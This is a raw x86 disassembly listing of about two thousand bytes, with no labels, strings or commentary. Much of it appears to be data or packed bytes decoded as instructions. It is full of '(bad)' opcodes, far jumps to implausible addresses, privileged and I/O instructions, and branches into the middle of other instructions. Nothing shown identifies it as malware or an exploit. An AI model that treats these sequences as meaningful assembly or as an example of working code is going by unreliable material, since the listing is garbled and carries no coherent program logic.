  4283bc:	add    BYTE PTR [ebp+0x0],al
  4283bf:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4283c5:	add    al,bh
  4283c7:	(bad)  
  4283c8:	jmp    0x8d85:0x74b0558d
  4283cf:	dec    DWORD PTR [eax]
  4283d1:	call   DWORD PTR [ebp-0x7b]
  4283d4:	mov    edi,esi
  4283d6:	lock call DWORD PTR [ebp-0x75]
  4283da:	mov    esi,esp
  4283dc:	mov    ah,0xc6
  4283de:	mov    bh,0xc3
  4283e0:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4283e6:	add    DWORD PTR [eax],0x450050ff
  4283ec:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4283f2:	inc    edi
  4283f4:	push   esp
  4283f6:	jmp    0xcd00:0x680481ff
  4283fd:	mov    DWORD PTR [ebx],esi
  4283ff:	clc    
  428400:	cmp    edi,0xff9cff3b
  428406:	jne    0x428410
  428408:	mov    eax,eax
  42840a:	add    esi,DWORD PTR [eax]
  42840c:	int3   
  42840d:	inc    ebp
  42840e:	cmp    al,0x83
  428410:	add    BYTE PTR [eax],bl
  428412:	adc    DWORD PTR [ebx+0x768b5055],eax
  428418:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  42841e:	mov    edi,eax
  428420:	cmp    BYTE PTR [ebp+0x45],cl
  428423:	jmp    0x4283b0
  428425:	mov    ebx,DWORD PTR [esp+ebp*8]
  428428:	inc    ebp
  428429:	or     al,0x2
  42842b:	dec    DWORD PTR [ebp+0x18]
  42842e:	jne    0x428485
  428430:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  428436:	mov    edi,DWORD PTR [ebx]
  428438:	in     al,0x50
  42843a:	xchg   ecx,eax
  42843b:	jmp    0x342d340
  428440:	adc    al,0x8b
  428442:	inc    ebp
  428443:	mov    al,ds:0x8b04008b
  428448:	push   ebp
  428449:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  42844f:	push   ebp
  428450:	test   DWORD PTR [ebx-0x2800d701],ecx
  428456:	inc    ebp
  428457:	dec    ebp
  428458:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  42845e:	mov    DWORD PTR [eax],0xe9ff00f4
  428464:	add    al,0x0
  428466:	add    BYTE PTR [eax],al
  428468:	mov    eax,edx
  42846a:	push   eax
  42846b:	rol    DWORD PTR [ebp-0xf0177],1
  428471:	bound  eax,QWORD PTR [ebp+0x50]
  428474:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  42847a:	add    BYTE PTR [ecx+0x558df0ff],cl
  428480:	mov    al,0xf
  428482:	test   DWORD PTR [edx],edx
  428484:	call   DWORD PTR [ebp-0x7a0001]
  42848a:	(bad)  
  42848b:	loop   0x42848c
  42848d:	jnp    0xc6987893
  428493:	mov    eax,ebx
  428495:	cmp    al,0x8b
  428497:	(bad)  
  428498:	cld    
  428499:	shr    esi,0xc
  42849c:	add    dl,al
  42849e:	push   eax
  42849f:	lea    eax,[ebp-0x1]
  4284a2:	mov    edx,esi
  4284a4:	cwde   
  4284a5:	cli    
  4284a6:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4284ac:	or     BYTE PTR [eax],cl
  4284ae:	inc    ebp
  4284af:	dec    ebp
  4284b0:	inc    DWORD PTR [ebx+0x74803914]
  4284b6:	add    DWORD PTR [ebx+0x451800],ecx
  4284bc:	call   DWORD PTR [eax+edx*1]
  4284bf:	add    ecx,DWORD PTR [ebp-0x34]
  4284c2:	push   edi
  4284c3:	adc    al,0x8
  4284c5:	mov    edx,DWORD PTR [ebp-0x14]
  4284c8:	mov    ecx,DWORD PTR [ebp+0x18]
  4284cb:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4284cf:	inc    DWORD PTR [eax+esi*8]
  4284d2:	inc    ebp
  4284d3:	stos   BYTE PTR es:[edi],al
  4284d4:	mov    edx,DWORD PTR [ebp-0x4]
  4284d7:	add    DWORD PTR [ebp-0x1c],eax
  4284da:	mov    edx,DWORD PTR [ebp-0x70]
  4284dd:	cmp    eax,DWORD PTR [eax]
  4284df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284e0:	mov    eax,DWORD PTR [eax]
  4284e2:	cld    
  4284e3:	jae    0x428465
  4284e5:	add    eax,DWORD PTR [ecx]
  4284e7:	clc    
  4284e8:	add    BYTE PTR [eax+0x30],dl
  4284eb:	mov    DWORD PTR [ecx],esi
  4284ed:	clc    
  4284ee:	pop    ds
  4284ef:	inc    ebp
  4284f0:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  4284f6:	(bad)  
  4284f7:	push   DWORD PTR [edi]
  4284f9:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4284ff:	(bad)  
  428500:	jae    0x428501
  428502:	mov    eax,DWORD PTR [ebp-0x740175]
  428508:	sub    eax,DWORD PTR [eax]
  42850a:	add    eax,DWORD PTR [eax]
  42850c:	mov    DWORD PTR [ecx+0x5f],eax
  42850f:	mov    DWORD PTR [ebx-0x4],ebx
  428512:	ret    0xff
  428515:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  42851b:	ret    
  42851c:	mov    eax,DWORD PTR [ebp-0x6f0075]
  428522:	add    BYTE PTR [ebp-0x7d],al
  428525:	mov    DWORD PTR [eax],eax
  428527:	add    al,0x84
  428529:	inc    DWORD PTR [ecx]
  42852b:	lea    eax,[eax]
  42852d:	hlt    
  42852e:	sar    bh,cl
  428530:	test   BYTE PTR [eax+0x1],dl
  428533:	inc    ebp
  428534:	add    BYTE PTR [ebx],dh
  428536:	test   BYTE PTR [ebx],0x84
  428539:	push   eax
  42853a:	add    BYTE PTR [ebp+0x0],al
  42853d:	add    eax,0x86
  428542:	add    BYTE PTR [ebx-0x7f7b0340],cl
  428548:	add    BYTE PTR [ecx],al
  42854a:	add    BYTE PTR [eax],al
  42854c:	mov    esi,0x550030
  428551:	mov    ecx,DWORD PTR [edi]
  428553:	cld    
  428554:	fidiv  DWORD PTR [ebp+0x0]
  428557:	mov    edi,DWORD PTR [ecx]
  428559:	xor    BYTE PTR [eax+eax*1],0x84
  42855d:	add    eax,DWORD PTR [eax]
  42855f:	sbb    BYTE PTR [eax],al
  428561:	jne    0x428514
  428563:	mov    eax,DWORD PTR [ecx]
  428565:	sbb    BYTE PTR [eax],al
  428567:	mov    DWORD PTR [ebp-0x1],esp
  42856a:	add    BYTE PTR [eax+0x30e45ca],bh
  428570:	ret    0xb7fc
  428573:	dec    ebp
  428574:	or     al,0x89
  428576:	dec    ebp
  428577:	cld    
  428578:	cmovne ecx,DWORD PTR [eax-0x75]
  42857c:	add    edi,esp
  42857e:	seto   BYTE PTR [esi-0x72ffffff]
  428585:	inc    ebp
  428586:	adc    al,0x8b
  428588:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  42858f:	cmp    DWORD PTR [edi+0x72],edx
  428592:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428598:	gs cmp al,0x0
  42859b:	je     0x428573
  42859d:	push   eax
  42859e:	sar    BYTE PTR [eax],1
  4285a0:	mov    bh,0x3e
  4285a2:	push   cs
  4285a3:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4285a9:	add    DWORD PTR [ecx+0x12],ebp
  4285ac:	dec    edx
  4285ad:	(bad)  
  4285ae:	mov    eax,edx
  4285b0:	in     al,dx
  4285b1:	adc    DWORD PTR [ecx],esi
  4285b3:	pop    esi
  4285b4:	inc    ecx
  4285b5:	leave  
  4285b6:	or     DWORD PTR [eax],ebx
  4285b8:	gs push ebp
  4285ba:	add    ah,ch
  4285bc:	into   
  4285bd:	in     al,dx
  4285be:	enter  0xb756,0xf0
  4285c2:	push   cs
  4285c3:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4285cd:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4285d3:	jnp    0x74430adb
  4285d9:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4285df:	add    BYTE PTR [edi],cl
  4285e1:	mov    edi,DWORD PTR [ecx-0x78]
  4285e4:	ltr    WORD PTR [ecx-0x7b]
  4285e8:	dec    DWORD PTR [edi]
  4285ea:	clc    
  4285eb:	out    0x45,eax
  4285ed:	add    BYTE PTR [eax],cl
  4285ef:	cmp    ebx,0xffffff8c
  4285f2:	jge    0x4285f4
  4285f4:	jb     0x428606
  4285f6:	je     0x518676
  4285fc:	pop    edx
  4285fd:	push   esi
  4285fe:	mov    ecx,DWORD PTR [edi]
  428600:	in     al,dx
  428601:	rol    DWORD PTR [ebp+0x0],1
  428604:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  42860b:	cmp    DWORD PTR [ecx],0xfffffff0
  42860e:	hlt    
  42860f:	mov    esp,DWORD PTR [eax+0xf034d2b]
  428615:	(bad)  
  428617:	push   eax
  428618:	jns    0xb8426a96
  42861e:	lock push cs
  428620:	ror    edx,0x3
  428623:	test   BYTE PTR [ecx+0x5500e800],cl
  428629:	dec    eax
  42862a:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42862e:	(bad)  
  42862f:	mov    esi,0x7f33ff5f
  428634:	inc    eax
  428635:	test   DWORD PTR [edx],eax
  428637:	je     0x4285f9
  428639:	mov    ecx,ecx
  42863b:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42863f:	and    eax,DWORD PTR [eax+0xf0103]
  428645:	jp     0x428633
  428647:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42864b:	add    edx,DWORD PTR [edi+0x74]
  42864e:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428654:	add    BYTE PTR [ebp-0x74c48bbb],al
  42865a:	je     0x4285df
  42865c:	cmp    eax,edi
  42865e:	js     0x428683
  428660:	add    eax,0xeb0fc003
  428665:	jns    0x4285f2
  428667:	vmread DWORD PTR [ecx+0x45],ebx
  42866b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428671:	adc    al,0x8b
  428673:	jge    0x428689
  428675:	mov    edi,DWORD PTR [eax-0x4]
  428678:	add    edi,DWORD PTR [edi]
  42867a:	or     bh,bh
  42867c:	push   ebp
  42867d:	push   es
  42867e:	mov    DWORD PTR [ebp-0x4],ebx
  428681:	add    edi,esi
  428683:	pop    es
  428684:	add    esi,DWORD PTR [edi-0x48ccf183]
  42868a:	mov    DWORD PTR [esp+esi*8],ecx
  42868d:	inc    ebp
  42868e:	pop    ebp
  42868f:	xor    DWORD PTR [esi-0x4],0x3b
  428693:	add    edx,DWORD PTR [ecx+edi*1]
  428696:	push   es
  428697:	clc    
  428698:	mov    bh,0xdb
  42869a:	jp     0x428653
  42869c:	add    cl,BYTE PTR [esi]
  42869e:	div    DWORD PTR [edi+0x4d8b0c1c]
  4286a4:	test   edi,edi
  4286a6:	je     0x42869c
  4286a8:	mov    eax,ecx
  4286aa:	or     BYTE PTR [ebx],al
  4286ac:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4286b2:	jbe    0x428726
  4286b4:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4286ba:	add    ecx,DWORD PTR [esi]
  4286bc:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4286c2:	add    eax,DWORD PTR [ebx-0x287af783]
  4286c8:	je     0x428717
  4286ca:	mov    DWORD PTR [ecx],edi
  4286cc:	mov    esi,eax
  4286ce:	hlt    
  4286cf:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4286d6:	jb     0x428698
  4286d8:	jmp    0x4286c5
  4286da:	xor    esi,DWORD PTR [ebx]
  4286dc:	pop    edi
  4286dd:	pop    esi
  4286de:	pop    ebx
  4286df:	ret    
  4286e0:	ret    0x8b
  4286e3:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4286e9:	cmp    DWORD PTR [eax],0xc
  4286ec:	pushf  
  4286ed:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4286f3:	(bad)  
  4286f5:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  4286fc:	dec    ebp
  4286fd:	ret    
  4286fe:	mov    edi,DWORD PTR [esi-0x4]
  428701:	pop    eax
  428702:	dec    ebp
  428703:	jne    0x428690
  428705:	xor    edi,esp
  428707:	inc    eax
  428708:	dec    ebp
  428709:	jbe    0x42875e
  42870b:	inc    eax
  42870c:	pop    ebp
  42870d:	add    edx,DWORD PTR [esi+0x8]
  428710:	push   eax
  428711:	dec    eax
  428712:	push   ecx
  428713:	mov    eax,edi
  428715:	and    al,0xf0
  428717:	jo     0x428704
  428719:	mov    eax,DWORD PTR [ebx]
  42871b:	sbb    BYTE PTR [ebp+0x4d],cl
  42871e:	mov    eax,DWORD PTR [ebx]
  428720:	nop
  428721:	or     BYTE PTR [eax],al
  428723:	jne    0x42877c
  428725:	cmp    ebx,DWORD PTR [eax+0x33893277]
  42872b:	cld    
  42872c:	xor    edi,edi
  42872e:	add    edi,DWORD PTR [ebp+0x3]
  428731:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428737:	js     0x4286bd
  428739:	jae    0x42873d
  42873b:	(bad)  
  42873d:	xor    al,0x5d
  42873f:	jmp    0x4286cc
  428741:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428748:	fdecstp 
  42874a:	test   BYTE PTR [edi],ah
  42874c:	add    bh,BYTE PTR [ebp+0x0]
  42874f:	add    ebx,DWORD PTR [ebp-0x77]
  428752:	mov    edi,eax
  428754:	cmp    al,0x0
  428757:	adc    dh,BYTE PTR [ebx]
  428759:	jge    0x42875e
  42875b:	mov    edi,DWORD PTR [ebx]
  42875d:	jl     0x42876e
  42875f:	clc    
  428760:	dec    edi
  428761:	jge    0x428763
  428763:	mov    eax,DWORD PTR [ebx]
  428765:	jb     0x42876f
  428767:	mov    ecx,DWORD PTR [ebp-0x8]
  42876a:	mov    edi,edi
  42876c:	xor    edx,DWORD PTR [eax]
  42876e:	add    edi,DWORD PTR [ebx]
  428770:	mov    DWORD PTR [ebp-0x10],edi
  428773:	inc    edi
  428774:	pop    ebp
  428775:	jge    0x4287b2
  428777:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42877b:	mov    edx,0xc05d87f0
  428780:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428784:	fimul  WORD PTR [eax]
  428786:	fist   WORD PTR [ebp+0x1c]
  428789:	in     al,dx
  42878a:	jne    0x428778
  42878c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428792:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428796:	fdivp  st(0),st
  428798:	fild   WORD PTR [ebp+0x4510f85c]
  42879e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  4287a4:	inc    ebp
  4287a5:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  4287ab:	mov    ebp,DWORD PTR [ebx-0x4]
  4287ae:	adc    al,0x8b
  4287b0:	rcl    DWORD PTR [eax],0x48
  4287b3:	mov    esi,0x7080803
  4287b8:	fiadd  WORD PTR [ebp+0x4d]
  4287bb:	mov    cs,WORD PTR [ebx+0x558bfc52]
  4287c1:	cld    
  4287c2:	xor    ebx,DWORD PTR [ebx+0x330103]
  4287c8:	mov    DWORD PTR [edi+0x872dc],edi
  4287ce:	xlat   BYTE PTR ds:[ebx]
  4287cf:	into   
  4287d0:	ffreep st(6)
  4287d2:	retf   0x6c7
  4287d5:	iret   
  4287d6:	dec    ebp
  4287d7:	inc    ebp
  4287d8:	mov    DWORD PTR [ebx],edi
  4287da:	fmul   QWORD PTR [edi]
  4287dc:	dec    ebp
  4287dd:	jnp    0x428812
  4287df:	add    BYTE PTR [ebx],al
  4287e1:	mov    ecx,DWORD PTR [esp+edi*8]
  4287e4:	inc    ebp
  4287e5:	dec    ebp
  4287e6:	lea    esi,[ebx]
  4287e8:	add    DWORD PTR [ebx],eax
  4287ea:	jb     0x428827
  4287ec:	add    BYTE PTR [edi],cl
  4287ee:	inc    ebp
  4287ef:	imul   eax,edi,0x858bd800
  4287f5:	cld    
  4287f6:	clc    
  4287f7:	mov    DWORD PTR [ebp+0x0],eax
  4287fa:	inc    DWORD PTR [eax]
  4287fc:	or     al,0xde
  4287fe:	sbb    bh,0x1
  428801:	retf   
  428802:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428809:	dec    ebp
  42880a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428810:	enter  0x12de,0xdf
  428814:	inc    ebp
  428815:	pop    ebp
  428816:	dec    DWORD PTR [ebx-0x257f0ff4]
  42881c:	add    DWORD PTR [edx],edx
  42881e:	add    BYTE PTR [ebp+0x50],dl
  428821:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428827:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  42882d:	or     ah,al
  42882f:	pop    ss
  428830:	cdq    
  428831:	push   ebp
  428832:	clc    
  428833:	mov    eax,DWORD PTR [ebp-0x4]
  428836:	xor    edx,edx
  428838:	add    esi,DWORD PTR [ebx]
  42883a:	cmp    eax,DWORD PTR [ebx]
  42883c:	hlt    
  42883d:	cmp    DWORD PTR [ebx],esp
  42883f:	or     al,BYTE PTR [ebp+0xf]
  428842:	mov    eax,DWORD PTR [edx]
  428844:	loopne 0x428846
  428846:	(bad)  
  428847:	mov    ecx,esi
  428849:	cld    
  42884a:	pushf  
  42884b:	pop    ebp
  42884c:	cwde   
  42884d:	mov    esi,DWORD PTR [edx]
  42884f:	lock mov eax,eax
  428852:	adc    BYTE PTR [ebx],al
  428854:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42885b:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428861:	dec    ebp
  428862:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428868:	(bad)  
  428869:	iret   
  42886a:	inc    ebp
  42886b:	(bad)  
  42886c:	jne    0x4288bb
  42886e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428874:	(bad)  
  428875:	cmp    ebx,eax
  428877:	je     0x4287ff
  428879:	add    edi,edi
  42887b:	or     bh,bh
  42887d:	dec    ebp
  42887e:	inc    ebp
  42887f:	mov    esi,DWORD PTR [ebx]
  428881:	cld    
  428882:	add    ecx,esi
  428884:	cmp    ecx,DWORD PTR [eax-0xc]
  428887:	mov    edx,DWORD PTR [edi]
  428889:	or     BYTE PTR [ebp-0x7c],al
  42888c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428892:	test   BYTE PTR [eax+ebx*4],cl
  428895:	inc    ebp
  428896:	xor    bh,BYTE PTR ds:0x8be89c89
  42889c:	out    dx,eax
  42889d:	adc    BYTE PTR [eax],al
  42889f:	jne    0x428868
  4288a1:	mov    ebp,esp
  4288a3:	fcomp  DWORD PTR [ebx]
  4288a5:	add    BYTE PTR [ecx],al
  4288a7:	inc    DWORD PTR [ebp-0x75]
  4288aa:	mov    ?,esp
  4288ac:	add    al,0xce
  4288ae:	mov    ecx,edi
  4288b0:	cld    
  4288b1:	inc    ebp
  4288b2:	fidivr WORD PTR [ebx]
  4288b4:	fbstp  TBYTE PTR [ebp-0x3e]
  4288b7:	mov    eax,DWORD PTR [eax]
  4288b9:	adc    BYTE PTR [ebx-0x3974038b],cl
  4288bf:	fadd   st,st(7)
  4288c1:	add    BYTE PTR [ebp-0x1],al
  4288c4:	mov    ecx,DWORD PTR [esp+edi*8]
  4288c7:	inc    ebp
  4288c8:	mov    bh,0xc7
  4288cb:	loopne 0x428912
  4288cd:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  4288d3:	add    DWORD PTR [ebx],esi
  4288d5:	pushf  
  4288d6:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  4288dc:	mov    eax,edi
  4288de:	cwde   
  4288df:	inc    ebp
  4288e0:	inc    ebp
  4288e1:	jne    0x42886e
  4288e3:	mov    esp,esp
  4288e5:	clc    
  4288e6:	add    al,0x4d
  4288e8:	mov    DWORD PTR [ebx],esi
  4288ea:	or     al,0x33
  4288ec:	inc    ebp
  4288ed:	lea    ecx,[ebx-0x398d13fd]
  4288f3:	add    bh,al
  4288f5:	inc    ebp
  4288f6:	ror    DWORD PTR [ebx+0x45d829],0x8b
  4288fd:	add    ebp,esp
  4288ff:	shufps xmm1,xmm3,0xc7
  428903:	(bad)  
  428904:	jmp    0x7487c42d
  428909:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  42890f:	hlt    
  428910:	mov    ecx,DWORD PTR [edi]
  428912:	fadd   DWORD PTR [ebp+0x0]
  428915:	xor    ecx,DWORD PTR [edi]
  428917:	add    ecx,ecx
  428919:	cmp    edi,edi
  42891b:	pmuludq mm7,QWORD PTR [edx+0x50]
  42891f:	(bad)  
  428920:	jmp    0x4288ad
  428922:	mov    edi,esp
  428924:	or     al,0xc6
  428926:	inc    ebp
  428927:	(bad)  
  428928:	mov    eax,DWORD PTR [ebp+0x10]
  42892b:	jne    0x4288b6
  42892d:	mov    eax,DWORD PTR [ecx]
  42892f:	clc    
  428930:	add    BYTE PTR [ebp-0x40],cl
  428933:	xor    edx,DWORD PTR [eax-0x73]
  428936:	jne    0x428939
  428938:	push   DWORD PTR [edx+0x8]
  42893b:	add    BYTE PTR [ebp+0x45],al
  42893e:	mov    ebp,ecx
  428940:	cld    
  428941:	add    BYTE PTR [ebp+0x0],cl
  428944:	xor    eax,DWORD PTR [ebp+0x3]
  428947:	mov    al,0x3b
  428949:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42894f:	sub    eax,0x5d330e4d
  428954:	lea    esi,[ebx]
  428956:	add    DWORD PTR [ebx],eax
  428958:	jb     0x428943
  42895a:	add    BYTE PTR [eax],al
  42895c:	inc    ebp
  42895d:	add    bl,ch
  42895f:	inc    ebp
  428960:	mov    esi,DWORD PTR [ebx]
  428962:	or     al,0x3
  428964:	(bad)  
  428965:	mov    edi,eax
  428967:	in     al,dx
  428968:	scas   eax,DWORD PTR es:[edi]
  428969:	inc    ebp
  42896a:	mov    esi,DWORD PTR [ebx]
  42896c:	in     al,0x3
  42896e:	add    al,0x89
  428970:	mov    ecx,DWORD PTR [eax+edi*8]
  428973:	dec    ebp
  428974:	(bad)  
  428975:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  42897c:	mov    ecx,eax
  42897e:	cld    
  42897f:	push   es
  428980:	dec    ebp
  428981:	add    al,0x33
  428983:	mov    DWORD PTR [ebx],eax
  428985:	in     al,dx
  428986:	cmp    DWORD PTR [ebp-0x67],eax
  428989:	mov    eax,DWORD PTR [ebp-0xba0068]
  42898f:	mov    edx,DWORD PTR [ebp-0x4]
  428992:	mov    ecx,DWORD PTR [ebp-0x18]
  428995:	xor    ecx,DWORD PTR [ebp+0x3]
  428998:	cmp    DWORD PTR [ebx],0x8b327497
  42899e:	xor    edi,esp
  4289a0:	jmp    0xff7686f2
  4289a5:	add    ecx,DWORD PTR [ebp-0x3f]
  4289a8:	xor    ebx,DWORD PTR [edi]
  4289aa:	add    eax,ecx
  4289ac:	cmp    ebx,DWORD PTR [eax]
  4289ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4289b1:	mov    ecx,DWORD PTR [eax]
  4289b3:	adc    BYTE PTR [ebp-0x80],al
  4289b6:	jmp    0x4289b9
  4289b8:	mov    eax,DWORD PTR [eax]
  4289ba:	cld    
  4289bb:	mov    bh,0xc6
  4289bd:	push   ecx
  4289be:	(bad)  
  4289bf:	jne    0x428a1f
  4289c1:	dec    ecx
  4289c3:	or     BYTE PTR [ecx+ebx*1],cl
  4289c6:	push   ebp
  4289c7:	inc    ebp
  4289c8:	in     al,dx
  4289c9:	add    ebp,esp
  4289cb:	or     bh,al
  4289cd:	dec    ebp
  4289ce:	cld    
  4289cf:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  4289d5:	cmp    DWORD PTR [ecx],0x2
  4289d8:	pushf  
  4289d9:	dec    DWORD PTR [ebx+0x45510cf4]
  4289df:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  4289e5:	mov    edx,DWORD PTR [ecx+0xc]
  4289e8:	xor    eax,esi
  4289ea:	mov    edx,0xc172c7
  4289ef:	inc    ebp
  4289f0:	mov    esi,DWORD PTR [ebp+0x8]
  4289f3:	mov    eax,edx
  4289f5:	call   0x84c750ea
  4289fa:	add    DWORD PTR [eax-0x76bace00],ebx
  428a00:	mov    ebp,eax
  428a02:	or     BYTE PTR [eax],dl
  428a04:	jo     0x428a53
  428a06:	push   edi
  428a07:	xor    esi,DWORD PTR [ebp+0x3]
  428a0a:	(bad)  
  428a0b:	pmulhuw mm0,mm1
  428a0e:	test   DWORD PTR [ebp-0x8],ecx
  428a11:	mov    DWORD PTR [ebp-0x67],eax
  428a14:	mov    eax,DWORD PTR [ebp-0x4]
  428a17:	xor    edi,DWORD PTR [ebp-0x73]
  428a1a:	xor    eax,DWORD PTR [ebx]
  428a1c:	xor    esi,DWORD PTR [edx+0x3]
  428a1f:	add    BYTE PTR [ecx],bh
  428a21:	inc    ebp
  428a22:	(bad)  
  428a23:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428a29:	mov    DWORD PTR [eax],0x750f0004
  428a2f:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428a35:	lock add BYTE PTR [ebp+0x0],al
  428a39:	mov    esi,DWORD PTR [ebp-0x2c]
  428a3c:	mov    ebp,edx
  428a3e:	or     al,0x72
  428a40:	ja     0x428a42
  428a42:	mov    edx,esi
  428a44:	cld    
  428a45:	(bad)  
  428a48:	cli    
  428a49:	mov    esi,DWORD PTR [ebp-0x4]
  428a4c:	cmp    ecx,esi
  428a4e:	bswap  edi
  428a50:	(bad)
  428a54:	mov    esi,DWORD PTR [ebp-0x4]
  428a57:	mov    esi,ecx
  428a59:	clc    
  428a5a:	repnz add esi,DWORD PTR [ebp+0x45]
  428a5e:	push   ebx
  428a5f:	xor    eax,DWORD PTR [ebp+0x3]
  428a62:	cmp    ebx,DWORD PTR [edi-0x64]
  428a65:	pop    ebx
  428a66:	jmp    0x428b2d
  428a6b:	mov    esi,DWORD PTR [ebp-0x7d]
  428a6e:	xor    ebp,DWORD PTR [eax]
  428a70:	lea    eax,[ebp-0x8]
  428a73:	cmp    dl,dh
  428a75:	pushf  
  428a76:	out    dx,eax
  428a77:	(bad)  
  428a78:	neg    eax
  428a7a:	ins    DWORD PTR es:[edi],dx
  428a7b:	test   esi,edi
  428a7d:	clc    
  428a7e:	pop    esp
  428a7f:	inc    ebp
  428a80:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428a86:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428a8c:	add    cl,al
  428a8e:	jne    0x428a28
  428a90:	mov    esi,DWORD PTR [edx]
  428a92:	in     al,dx
  428a93:	push   esi
  428a94:	xor    BYTE PTR [ebp-0xe],dh
  428a97:	add    edi,esi
  428a99:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428a9f:	add    cl,bh
  428aa1:	mov    edi,DWORD PTR [ebp+0x8]
  428aa4:	mov    DWORD PTR [ebp-0x14],esi
  428aa7:	add    esi,DWORD PTR [ebp+0x3c]
  428aaa:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428ab0:	mov    ah,0x3d
  428ab2:	cwde   
  428ab3:	pushf  
  428ab4:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428aba:	jne    0x428a47
  428abc:	mov    ecx,DWORD PTR [esp+ebp*8]
  428abf:	icebp  
  428ac0:	icebp  
  428ac1:	shl    edx,0xf2
  428ac4:	(bad)  
  428ac5:	mov    ah,0x16
  428ac7:	cmp    BYTE PTR [ebp-0x6d],dh
  428aca:	mov    ecx,DWORD PTR [edi]
  428acc:	in     al,dx
  428acd:	jmp    0x428ac0
  428acf:	add    dl,dh
  428ad1:	mov    edi,esi
  428ad3:	or     al,0x8
  428ad5:	inc    ebp
  428ad6:	jne    0x428adb
  428ad8:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428ade:	ret    
  428adf:	or     bh,bh
  428ae1:	jge    0x428acb
  428ae3:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428ae9:	xor    edi,eax
  428aeb:	add    esi,DWORD PTR [ebp-0x77]
  428aee:	mov    ebx,esp
  428af0:	clc    
  428af1:	neg    DWORD PTR [ebp-0x7c]
  428af4:	xor    eax,DWORD PTR [eax]
  428af6:	cmp    eax,DWORD PTR [eax]
  428af8:	repz jne 0x428a90
  428afb:	xor    eax,DWORD PTR [ecx]
  428afd:	add    ebx,DWORD PTR [eax]
  428aff:	mov    DWORD PTR [ebp-0x8],eax
  428b02:	mov    eax,edi
  428b04:	cld    
  428b05:	lock pop eax
  428b07:	test   DWORD PTR [ebx],esi
  428b09:	clc    
  428b0a:	add    edx,DWORD PTR [edi-0x740bff77]
  428b10:	fdivp  st(4),st
  428b12:	test   ecx,esi
  428b14:	(bad)  
  428b15:	jnp    0x428b16
  428b17:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428b1d:	jae    0x428aaa
  428b1f:	sub    edi,esp
  428b21:	(bad)  
  428b22:	shl    DWORD PTR [eax-0x3e],0x89
  428b26:	leave  
  428b27:	call   0x81984234
  428b2c:	in     al,dx
  428b2d:	(bad)  
  428b2e:	in     al,dx
  428b2f:	add    bh,al
  428b31:	mov    esp,edi
  428b33:	in     al,dx
  428b34:	test   DWORD PTR [ebp-0x8],edi
  428b37:	mov    eax,DWORD PTR [ebp+0x2b]
  428b3a:	cmp    DWORD PTR [ebx],eax
  428b3c:	pushf  
  428b3d:	jnp    0x57318776
  428b43:	xor    edx,DWORD PTR [eax-0x77]
  428b46:	push   ecx
  428b47:	loopne 0x428b7c
  428b49:	jne    0x428b06
  428b4b:	mov    esi,DWORD PTR [edx-0x20]
  428b4e:	add    BYTE PTR [ebp-0x3d],bh
  428b51:	xor    eax,DWORD PTR [ebp-0x73]
